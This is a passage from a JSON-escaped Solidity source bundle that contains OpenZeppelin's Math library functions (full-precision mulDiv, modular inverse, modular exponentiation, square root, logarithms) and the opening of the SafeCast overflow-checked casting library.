2 - denominator * inverse; // inverse mod 2\\u2076\\u2074\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u00b9\\u00b2\\u2078\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u00b2\\u2075\\u2076\\n\\n            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.\\n            // This will give us the correct result modulo 2\\u00b2\\u2075\\u2076. Since the preconditions guarantee that the outcome is\\n            // less than 2\\u00b2\\u2075\\u2076, this is the final result. We don't need to compute the high bits of the result and high\\n            // is no longer required.\\n            result = low * inverse;\\n            return result;\\n        }\\n    }\\n\\n    /**\\n     * @dev Calculates x * y / denominator with full precision, following the selected rounding direction.\\n     */\\n    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {\\n        return mulDiv(x, y, denominator) + SafeCast.toUint(unsignedRoundsUp(rounding) && mulmod(x, y, denominator) > 0);\\n    }\\n\\n    /**\\n     * @dev Calculates floor(x * y >> n) with full precision. Throws if result overflows a uint256.\\n     */\\n    function mulShr(uint256 x, uint256 y, uint8 n) internal pure returns (uint256 result) {\\n        unchecked {\\n            (uint256 high, uint256 low) = mul512(x, y);\\n            if (high >= 1 << n) {\\n                Panic.panic(Panic.UNDER_OVERFLOW);\\n            }\\n            return (high << (256 - n)) | (low >> n);\\n        }\\n    }\\n\\n    /**\\n     * @dev Calculates x * y >> n with full precision, following the selected rounding direction.\\n     */\\n    function mulShr(uint256 x, uint256 y, uint8 n, Rounding rounding) internal pure returns (uint256) {\\n        return mulShr(x, y, n) + SafeCast.toUint(unsignedRoundsUp(rounding) && mulmod(x, y, 1 << n) > 0);\\n    }\\n\\n    /**\\n     * @dev Calculate the modular multiplicative inverse of a number in Z/nZ.\\n     *\\n     * If n is a prime, then Z/nZ is a field. In that case all elements are inversible, except 0.\\n     * If n is not a prime, then Z/nZ is not a field, and some elements might not be inversible.\\n     *\\n     * If the input value is not inversible, 0 is returned.\\n     *\\n     * NOTE: If you know for sure that n is (big) a prime, it may be cheaper to use Fermat's little theorem and get the\\n     * inverse using `Math.modExp(a, n - 2, n)`. See {invModPrime}.\\n     */\\n    function invMod(uint256 a, uint256 n) internal pure returns (uint256) {\\n        unchecked {\\n            if (n == 0) return 0;\\n\\n            // The inverse modulo is calculated using the Extended Euclidean Algorithm (iterative version)\\n            // Used to compute integers x and y such that: ax + ny = gcd(a, n).\\n            // When the gcd is 1, then the inverse of a modulo n exists and it's x.\\n            // ax + ny = 1\\n            // ax = 1 + (-y)n\\n            // ax \\u2261 1 (mod n) # x is the inverse of a modulo n\\n\\n            // If the remainder is 0 the gcd is n right away.\\n            uint256 remainder = a % n;\\n            uint256 gcd = n;\\n\\n            // Therefore the initial coefficients are:\\n            // ax + ny = gcd(a, n) = n\\n            // 0a + 1n = n\\n            int256 x = 0;\\n            int256 y = 1;\\n\\n            while (remainder != 0) {\\n                uint256 quotient = gcd / remainder;\\n\\n                (gcd, remainder) = (\\n                    // The old remainder is the next gcd to try.\\n                    remainder,\\n                    // Compute the next remainder.\\n                    // Can't overflow given that (a % gcd) * (gcd // (a % gcd)) <= gcd\\n                    // where gcd is at most n (capped to type(uint256).max)\\n                    gcd - remainder * quotient\\n                );\\n\\n                (x, y) = (\\n                    // Increment the coefficient of a.\\n                    y,\\n                    // Decrement the coefficient of n.\\n                    // Can overflow, but the result is casted to uint256 so that the\\n                    // next value of y is \\\"wrapped around\\\" to a value between 0 and n - 1.\\n                    x - y * int256(quotient)\\n                );\\n            }\\n\\n            if (gcd != 1) return 0; // No inverse exists.\\n            return ternary(x < 0, n - uint256(-x), uint256(x)); // Wrap the result if it's negative.\\n        }\\n    }\\n\\n    /**\\n     * @dev Variant of {invMod}. More efficient, but only works if `p` is known to be a prime greater than `2`.\\n     *\\n     * From https://en.wikipedia.org/wiki/Fermat%27s_little_theorem[Fermat's little theorem], we know that if p is\\n     * prime, then `a**(p-1) \\u2261 1 mod p`. As a consequence, we have `a * a**(p-2) \\u2261 1 mod p`, which means that\\n     * `a**(p-2)` is the modular multiplicative inverse of a in Fp.\\n     *\\n     * NOTE: this function does NOT check that `p` is a prime greater than `2`.\\n     */\\n    function invModPrime(uint256 a, uint256 p) internal view returns (uint256) {\\n        unchecked {\\n            return Math.modExp(a, p - 2, p);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the modular exponentiation of the specified base, exponent and modulus (b ** e % m)\\n     *\\n     * Requirements:\\n     * - modulus can't be zero\\n     * - underlying staticcall to precompile must succeed\\n     *\\n     * IMPORTANT: The result is only valid if the underlying call succeeds. When using this function, make\\n     * sure the chain you're using it on supports the precompiled contract for modular exponentiation\\n     * at address 0x05 as specified in https://eips.ethereum.org/EIPS/eip-198[EIP-198]. Otherwise,\\n     * the underlying function will succeed given the lack of a revert, but the result may be incorrectly\\n     * interpreted as 0.\\n     */\\n    function modExp(uint256 b, uint256 e, uint256 m) internal view returns (uint256) {\\n        (bool success, uint256 result) = tryModExp(b, e, m);\\n        if (!success) {\\n            Panic.panic(Panic.DIVISION_BY_ZERO);\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Returns the modular exponentiation of the specified base, exponent and modulus (b ** e % m).\\n     * It includes a success flag indicating if the operation succeeded. Operation will be marked as failed if trying\\n     * to operate modulo 0 or if the underlying precompile reverted.\\n     *\\n     * IMPORTANT: The result is only valid if the success flag is true. When using this function, make sure the chain\\n     * you're using it on supports the precompiled contract for modular exponentiation at address 0x05 as specified in\\n     * https://eips.ethereum.org/EIPS/eip-198[EIP-198]. Otherwise, the underlying function will succeed given the lack\\n     * of a revert, but the result may be incorrectly interpreted as 0.\\n     */\\n    function tryModExp(uint256 b, uint256 e, uint256 m) internal view returns (bool success, uint256 result) {\\n        if (m == 0) return (false, 0);\\n        assembly (\\\"memory-safe\\\") {\\n            let ptr := mload(0x40)\\n            // | Offset    | Content    | Content (Hex)                                                      |\\n            // |-----------|------------|--------------------------------------------------------------------|\\n            // | 0x00:0x1f | size of b  | 0x0000000000000000000000000000000000000000000000000000000000000020 |\\n            // | 0x20:0x3f | size of e  | 0x0000000000000000000000000000000000000000000000000000000000000020 |\\n            // | 0x40:0x5f | size of m  | 0x0000000000000000000000000000000000000000000000000000000000000020 |\\n            // | 0x60:0x7f | value of b | 0x<.............................................................b> |\\n            // | 0x80:0x9f | value of e | 0x<.............................................................e> |\\n            // | 0xa0:0xbf | value of m | 0x<.............................................................m> |\\n            mstore(ptr, 0x20)\\n            mstore(add(ptr, 0x20), 0x20)\\n            mstore(add(ptr, 0x40), 0x20)\\n            mstore(add(ptr, 0x60), b)\\n            mstore(add(ptr, 0x80), e)\\n            mstore(add(ptr, 0xa0), m)\\n\\n            // Given the result < m, it's guaranteed to fit in 32 bytes,\\n            // so we can use the memory scratch space located at offset 0.\\n            success := staticcall(gas(), 0x05, ptr, 0xc0, 0x00, 0x20)\\n            result := mload(0x00)\\n        }\\n    }\\n\\n    /**\\n     * @dev Variant of {modExp} that supports inputs of arbitrary length.\\n     */\\n    function modExp(bytes memory b, bytes memory e, bytes memory m) internal view returns (bytes memory) {\\n        (bool success, bytes memory result) = tryModExp(b, e, m);\\n        if (!success) {\\n            Panic.panic(Panic.DIVISION_BY_ZERO);\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Variant of {tryModExp} that supports inputs of arbitrary length.\\n     */\\n    function tryModExp(\\n        bytes memory b,\\n        bytes memory e,\\n        bytes memory m\\n    ) internal view returns (bool success, bytes memory result) {\\n        if (_zeroBytes(m)) return (false, new bytes(0));\\n\\n        uint256 mLen = m.length;\\n\\n        // Encode call args in result and move the free memory pointer\\n        result = abi.encodePacked(b.length, e.length, mLen, b, e, m);\\n\\n        assembly (\\\"memory-safe\\\") {\\n            let dataPtr := add(result, 0x20)\\n            // Write result on top of args to avoid allocating extra memory.\\n            success := staticcall(gas(), 0x05, dataPtr, mload(result), dataPtr, mLen)\\n            // Overwrite the length.\\n            // result.length > returndatasize() is guaranteed because returndatasize() == m.length\\n            mstore(result, mLen)\\n            // Set the memory pointer after the returned data.\\n            mstore(0x40, add(dataPtr, mLen))\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns whether the provided byte array is zero.\\n     */\\n    function _zeroBytes(bytes memory byteArray) private pure returns (bool) {\\n        for (uint256 i = 0; i < byteArray.length; ++i) {\\n            if (byteArray[i] != 0) {\\n                return false;\\n            }\\n        }\\n        return true;\\n    }\\n\\n    /**\\n     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded\\n     * towards zero.\\n     *\\n     * This method is based on Newton's method for computing square roots; the algorithm is restricted to only\\n     * using integer operations.\\n     */\\n    function sqrt(uint256 a) internal pure returns (uint256) {\\n        unchecked {\\n            // Take care of easy edge cases when a == 0 or a == 1\\n            if (a <= 1) {\\n                return a;\\n            }\\n\\n            // In this function, we use Newton's method to get a root of `f(x) := x\\u00b2 - a`. It involves building a\\n            // sequence x_n that converges toward sqrt(a). For each iteration x_n, we also define the error between\\n            // the current value as `\\u03b5_n = | x_n - sqrt(a) |`.\\n            //\\n            // For our first estimation, we consider `e` the smallest power of 2 which is bigger than the square root\\n            // of the target. (i.e. `2**(e-1) \\u2264 sqrt(a) < 2**e`). We know that `e \\u2264 128` because `(2\\u00b9\\u00b2\\u2078)\\u00b2 = 2\\u00b2\\u2075\\u2076` is\\n            // bigger than any uint256.\\n            //\\n            // By noticing that\\n            // `2**(e-1) \\u2264 sqrt(a) < 2**e \\u2192 (2**(e-1))\\u00b2 \\u2264 a < (2**e)\\u00b2 \\u2192 2**(2*e-2) \\u2264 a < 2**(2*e)`\\n            // we can deduce that `e - 1` is `log2(a) / 2`. We can thus compute `x_n = 2**(e-1)` using a method similar\\n            // to the msb function.\\n            uint256 aa = a;\\n            uint256 xn = 1;\\n\\n            if (aa >= (1 << 128)) {\\n                aa >>= 128;\\n                xn <<= 64;\\n            }\\n            if (aa >= (1 << 64)) {\\n                aa >>= 64;\\n                xn <<= 32;\\n            }\\n            if (aa >= (1 << 32)) {\\n                aa >>= 32;\\n                xn <<= 16;\\n            }\\n            if (aa >= (1 << 16)) {\\n                aa >>= 16;\\n                xn <<= 8;\\n            }\\n            if (aa >= (1 << 8)) {\\n                aa >>= 8;\\n                xn <<= 4;\\n            }\\n            if (aa >= (1 << 4)) {\\n                aa >>= 4;\\n                xn <<= 2;\\n            }\\n            if (aa >= (1 << 2)) {\\n                xn <<= 1;\\n            }\\n\\n            // We now have x_n such that `x_n = 2**(e-1) \\u2264 sqrt(a) < 2**e = 2 * x_n`. This implies \\u03b5_n \\u2264 2**(e-1).\\n            //\\n            // We can refine our estimation by noticing that the middle of that interval minimizes the error.\\n            // If we move x_n to equal 2**(e-1) + 2**(e-2), then we reduce the error to \\u03b5_n \\u2264 2**(e-2).\\n            // This is going to be our x_0 (and \\u03b5_0)\\n            xn = (3 * xn) >> 1; // \\u03b5_0 := | x_0 - sqrt(a) | \\u2264 2**(e-2)\\n\\n            // From here, Newton's method give us:\\n            // x_{n+1} = (x_n + a / x_n) / 2\\n            //\\n            // One should note that:\\n            // x_{n+1}\\u00b2 - a = ((x_n + a / x_n) / 2)\\u00b2 - a\\n            //              = ((x_n\\u00b2 + a) / (2 * x_n))\\u00b2 - a\\n            //              = (x_n\\u2074 + 2 * a * x_n\\u00b2 + a\\u00b2) / (4 * x_n\\u00b2) - a\\n            //              = (x_n\\u2074 + 2 * a * x_n\\u00b2 + a\\u00b2 - 4 * a * x_n\\u00b2) / (4 * x_n\\u00b2)\\n            //              = (x_n\\u2074 - 2 * a * x_n\\u00b2 + a\\u00b2) / (4 * x_n\\u00b2)\\n            //              = (x_n\\u00b2 - a)\\u00b2 / (2 * x_n)\\u00b2\\n            //              = ((x_n\\u00b2 - a) / (2 * x_n))\\u00b2\\n            //              \\u2265 0\\n            // Which proves that for all n \\u2265 1, sqrt(a) \\u2264 x_n\\n            //\\n            // This gives us the proof of quadratic convergence of the sequence:\\n            // \\u03b5_{n+1} = | x_{n+1} - sqrt(a) |\\n            //         = | (x_n + a / x_n) / 2 - sqrt(a) |\\n            //         = | (x_n\\u00b2 + a - 2*x_n*sqrt(a)) / (2 * x_n) |\\n            //         = | (x_n - sqrt(a))\\u00b2 / (2 * x_n) |\\n            //         = | \\u03b5_n\\u00b2 / (2 * x_n) |\\n            //         = \\u03b5_n\\u00b2 / | (2 * x_n) |\\n            //\\n            // For the first iteration, we have a special case where x_0 is known:\\n            // \\u03b5_1 = \\u03b5_0\\u00b2 / | (2 * x_0) |\\n            //     \\u2264 (2**(e-2))\\u00b2 / (2 * (2**(e-1) + 2**(e-2)))\\n            //     \\u2264 2**(2*e-4) / (3 * 2**(e-1))\\n            //     \\u2264 2**(e-3) / 3\\n            //     \\u2264 2**(e-3-log2(3))\\n            //     \\u2264 2**(e-4.5)\\n            //\\n            // For the following iterations, we use the fact that, 2**(e-1) \\u2264 sqrt(a) \\u2264 x_n:\\n            // \\u03b5_{n+1} = \\u03b5_n\\u00b2 / | (2 * x_n) |\\n            //         \\u2264 (2**(e-k))\\u00b2 / (2 * 2**(e-1))\\n            //         \\u2264 2**(2*e-2*k) / 2**e\\n            //         \\u2264 2**(e-2*k)\\n            xn = (xn + a / xn) >> 1; // \\u03b5_1 := | x_1 - sqrt(a) | \\u2264 2**(e-4.5)  -- special case, see above\\n            xn = (xn + a / xn) >> 1; // \\u03b5_2 := | x_2 - sqrt(a) | \\u2264 2**(e-9)    -- general case with k = 4.5\\n            xn = (xn + a / xn) >> 1; // \\u03b5_3 := | x_3 - sqrt(a) | \\u2264 2**(e-18)   -- general case with k = 9\\n            xn = (xn + a / xn) >> 1; // \\u03b5_4 := | x_4 - sqrt(a) | \\u2264 2**(e-36)   -- general case with k = 18\\n            xn = (xn + a / xn) >> 1; // \\u03b5_5 := | x_5 - sqrt(a) | \\u2264 2**(e-72)   -- general case with k = 36\\n            xn = (xn + a / xn) >> 1; // \\u03b5_6 := | x_6 - sqrt(a) | \\u2264 2**(e-144)  -- general case with k = 72\\n\\n            // Because e \\u2264 128 (as discussed during the first estimation phase), we know have reached a precision\\n            // \\u03b5_6 \\u2264 2**(e-144) < 1. Given we're operating on integers, then we can ensure that xn is now either\\n            // sqrt(a) or sqrt(a) + 1.\\n            return xn - SafeCast.toUint(xn > a / xn);\\n        }\\n    }\\n\\n    /**\\n     * @dev Calculates sqrt(a), following the selected rounding direction.\\n     */\\n    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = sqrt(a);\\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && result * result < a);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 x) internal pure returns (uint256 r) {\\n        // If value has upper 128 bits set, log2 result is at least 128\\n        r = SafeCast.toUint(x > 0xffffffffffffffffffffffffffffffff) << 7;\\n        // If upper 64 bits of 128-bit half set, add 64 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffffffffffffffff) << 6;\\n        // If upper 32 bits of 64-bit half set, add 32 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffffffff) << 5;\\n        // If upper 16 bits of 32-bit half set, add 16 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffff) << 4;\\n        // If upper 8 bits of 16-bit half set, add 8 to result\\n        r |= SafeCast.toUint((x >> r) > 0xff) << 3;\\n        // If upper 4 bits of 8-bit half set, add 4 to result\\n        r |= SafeCast.toUint((x >> r) > 0xf) << 2;\\n\\n        // Shifts value right by the current result and use it as an index into this lookup table:\\n        //\\n        // | x (4 bits) |  index  | table[index] = MSB position |\\n        // |------------|---------|-----------------------------|\\n        // |    0000    |    0    |        table[0] = 0         |\\n        // |    0001    |    1    |        table[1] = 0         |\\n        // |    0010    |    2    |        table[2] = 1         |\\n        // |    0011    |    3    |        table[3] = 1         |\\n        // |    0100    |    4    |        table[4] = 2         |\\n        // |    0101    |    5    |        table[5] = 2         |\\n        // |    0110    |    6    |        table[6] = 2         |\\n        // |    0111    |    7    |        table[7] = 2         |\\n        // |    1000    |    8    |        table[8] = 3         |\\n        // |    1001    |    9    |        table[9] = 3         |\\n        // |    1010    |   10    |        table[10] = 3        |\\n        // |    1011    |   11    |        table[11] = 3        |\\n        // |    1100    |   12    |        table[12] = 3        |\\n        // |    1101    |   13    |        table[13] = 3        |\\n        // |    1110    |   14    |        table[14] = 3        |\\n        // |    1111    |   15    |        table[15] = 3        |\\n        //\\n        // The lookup table is represented as a 32-byte value with the MSB positions for 0-15 in the last 16 bytes.\\n        assembly (\\\"memory-safe\\\") {\\n            r := or(r, byte(shr(r, x), 0x0000010102020202030303030303030300000000000000000000000000000000))\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log2(value);\\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 1 << result < value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >= 10 ** 64) {\\n                value /= 10 ** 64;\\n                result += 64;\\n            }\\n            if (value >= 10 ** 32) {\\n                value /= 10 ** 32;\\n                result += 32;\\n            }\\n            if (value >= 10 ** 16) {\\n                value /= 10 ** 16;\\n                result += 16;\\n            }\\n            if (value >= 10 ** 8) {\\n                value /= 10 ** 8;\\n                result += 8;\\n            }\\n            if (value >= 10 ** 4) {\\n                value /= 10 ** 4;\\n                result += 4;\\n            }\\n            if (value >= 10 ** 2) {\\n                value /= 10 ** 2;\\n                result += 2;\\n            }\\n            if (value >= 10 ** 1) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log10(value);\\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 10 ** result < value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     *\\n     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.\\n     */\\n    function log256(uint256 x) internal pure returns (uint256 r) {\\n        // If value has upper 128 bits set, log2 result is at least 128\\n        r = SafeCast.toUint(x > 0xffffffffffffffffffffffffffffffff) << 7;\\n        // If upper 64 bits of 128-bit half set, add 64 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffffffffffffffff) << 6;\\n        // If upper 32 bits of 64-bit half set, add 32 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffffffff) << 5;\\n        // If upper 16 bits of 32-bit half set, add 16 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffff) << 4;\\n        // Add 1 if upper 8 bits of 16-bit half set, and divide accumulated result by 8\\n        return (r >> 3) | SafeCast.toUint((x >> r) > 0xff);\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log256(value);\\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 1 << (result << 3) < value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns whether a provided rounding mode is considered rounding up for unsigned integers.\\n     */\\n    function unsignedRoundsUp(Rounding rounding) internal pure returns (bool) {\\n        return uint8(rounding) % 2 == 1;\\n    }\\n}\\n\",\"keccak256\":\"0x1225214420c83ebcca88f2ae2b50f053aaa7df7bd684c3e878d334627f2edfc6\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/math/SafeCast.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/math/SafeCast.sol)\\n// This file was procedurally generated from scripts/generate/templates/SafeCast.js.\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Wrappers over Solidity's uintXX/intXX/bool casting operators with added overflow\\n * checks.\\n *\\n * Downcasting from uint256/int256 in Solidity does not revert on overflow. This can\\n * easily result in undesired exploitation or bugs, since developers usually\\n * assume that overflows raise errors. `SafeCast` restores this intuition by\\n * reverting the transaction when such an operation overflows.\\n *\\n * Using this library instead of the unchecked operations eliminates an entire\\n * class of bugs, so it's recommended to use it always.\\n */\\nlibrary SafeCast {\\n    /**\\n     * @dev Value doesn't fit in an uint of `bits` size.\\n     */\\n    error SafeCastOverflowedUintDowncast(uint8 bits, uint256 value);\\n\\n    /**\\n     * @dev An int value doesn't fit in an uint of `bits` size.\\n     */\\n    error SafeCastOverflowedIntToUint(int256 value);\\n\\n    /**\\n     * @dev Value doesn't fit in an int of `bits` size.\\n     */\\n    error SafeCastOverflowedIntDowncast(uint8 bits, int256 value);\\n\\n    /**\\n     * @dev An uint value doesn't fit in an int of `bits` size.\\n     */\\n    error SafeCastOverflowedUintToInt(uint256 value);\\n\\n    /**\\n     * @dev Returns the downcasted uint248 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint248).\\n     *\\n     * Counterpart to Solidity's `uint248` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 248 bits\\n     */\\n    function toUint248(uint256 value) internal pure returns (uint248) {\\n        if (value > type(uint248).max) {\\n            revert SafeCastOverflowedUintDowncast(248, value);\\n        }\\n        return uint248(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint240 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint240).\\n     *\\n     * Counterpart to Solidity's `uint240` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 240 bits\\n     */\\n    function toUint240(uint256 value) internal pure returns (uint240) {\\n        if (value > type(uint240).max) {\\n            revert SafeCastOverflowedUintDowncast(240, value);\\n        }\\n        return uint240(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint232 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint232).\\n     *\\n     * Counterpart to Solidity's `uint232` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 232 bits\\n     */\\n    function toUint232(uint256 value) internal pure returns (uint232) {\\n        if (value > type(uint232).max) {\\n            revert SafeCastOverflowedUintDowncast(232, value);\\n        }\\n        return uint232(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint224 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint224).\\n     *\\n     * Counterpart to Solidity's `uint224` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 224 bits\\n     */\\n    function toUint224(uint256 value) internal pure returns (uint224) {\\n        if (value > type(uint224).max) {\\n            revert SafeCastOverflowedUintDowncast(224, value);\\n        }\\n        return uint224(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint216 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint216).\\n     *\\n     * Counterpart to Solidity's `uint216` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 216 bits\\n     */\\n    function toUint216(uint256 value) internal pure returns (uint216) {\\n        if (value > type(uint216).max) {\\n            revert SafeCastOverflowedUintDowncast(216, value);\\n        }\\n        return uint216(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint208 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint208).\\n     *\\n     * Counterpart to Solidity's `uint208` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 208 bits\\n     */\\n    function toUint208(uint256 value) internal pure returns (uint208) {\\n        if (value > type(uint208).max) {\\n            revert SafeCastOverflowedUintDowncast(208, value);\\n        }\\n        return uint208(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint200 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint200).\\n     *\\n     * Counterpart to Solidity's `uint200` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 200 bits\\n     */\\n    function toUint200(uint256 value) internal pure returns (uint200) {\\n        if (value > type(uint200).max) {\\n            revert SafeCastOverflowedUintDowncast(200, value);\\n        }\\n        return uint200(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint192 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint192).\\n     *\\n     * Counterpart to Solidity's `uint192` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 192 bits\\n     */\\n    function toUint192(uint256 value) internal pure returns (uint192) {\\n        if (value > type(uint192).max) {\\n            revert SafeCastOverflowedUintDowncast(192, value);\\n        }\\n        return uint192(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint184 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint184).\\n     *\\n     * Counterpart to Solidity's `uint184` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 184 bits\\n     */\\n    function toUint184(uint256 value) internal pure returns (uint184) {\\n        if (value > type(uint184).max) {\\n            revert SafeCastOverflowedUintDowncast(184, value);\\n        }\\n        return uint184(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint176 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint176).\\n     *\\n     * Counterpart to Solidity's `uint176` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 176 bits\\n     */\\n    function toUint176(uint256 value) internal pure returns (uint176) {\\n        if (value > type(uint176).max) {\\n            revert SafeCastOverflowedUintDowncast(176, value);\\n        }\\n        return uint176(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint168 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint168).\\n     *\\n     * Counterpart to Solidity's `uint168` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 168 bits\\n     */\\n    function toUint168(uint256 value) internal pure returns (uint168) {\\n        if (value > type(uint168).max) {\\n            revert SafeCastOverflowedUintDowncast(168, value);\\n        }\\n        return uint168(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint160 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint160).\\n     *\\n     * Counterpart to Solidity's `uint160` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 160 bits\\n     */\\n    function toUint160(uint256 value) internal pure returns (uint160) {\\n        if (value > type(uint160).max) {\\n            revert SafeCastOverflowedUintDowncast(160, value);\\n        }\\n        return uint160(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint152 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint152).\\n     *\\n     * Counterpart to Solidity's `uint152` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 152 bits\\n     */\\n    function toUint152(uint256 value) internal pure returns (uint152) {\\n        if (value > type(uint152).max) {\\n            revert SafeCastOverflowedUintDowncast(152, value);\\n        }\\n        return uint152(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint144 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint144).\\n     *\\n     * Counterpart to Solidity's `uint144` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 144 bits\\n     */\\n    function toUint144(uint256 value) internal pure returns (uint144) {\\n        if (value > type(uint144).max) {\\n            revert SafeCastOverflowedUintDowncast(144, value);\\n        }\\n        return uint144(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint136 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint136).\\n     *\\n     * Counterpart to Solidity's `uint136` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 136 bits\\n     */\\n    function toUint136(uint256 value) internal pure returns (uint136) {\\n        if (value > type(uint136).max) {\\n            revert SafeCastOverflowedUintDowncast(136, value);\\n        }\\n        return uint136(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint128 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint128).\\n     *\\n     * Counterpart to Solidity's `uint128` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 128 bits\\n     */\\n    function toUint128(uint256 value) internal pure returns (uint128) {\\n        if (value > type(uint128).max) {\\n            revert SafeCastOverflowedUintDowncast(128, value);\\n        }\\n        return uint128(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint120 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint120).\\n     *\\n     * Counterpart to Solidity's `uint120` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 120 bits\\n     */\\n    function toUint120(uint256 value) internal pure returns (uint120) {\\n        if (value > type(uint120).max) {\\n            revert SafeCastOverflowedUintDowncast(120, value);\\n        }\\n        return uint120(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint112 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint112).\\n     *\\n     * Counterpart to Solidity's `uint112` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 112 bits\\n     */\\n    function toUint112(uint256 value) internal pure returns (uint112) {\\n        if (value > type(uint112).max) {\\n            revert SafeCastOverflowedUintDowncast(112, value);\\n        }\\n        return uint112(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint104 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint104).\\n     *\\n     * Counterpart to Solidity's `uint104` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 104 bits\\n     */\\n    function toUint104(uint256 value) internal pure returns (uint104) {\\n        if (value > type(uint104).max) {\\n            revert SafeCastOverflowedUintDowncast(104, value);\\n        }\\n        return uint104(value);\\n    }\\n\\n    /**\\n     * @dev Returns the 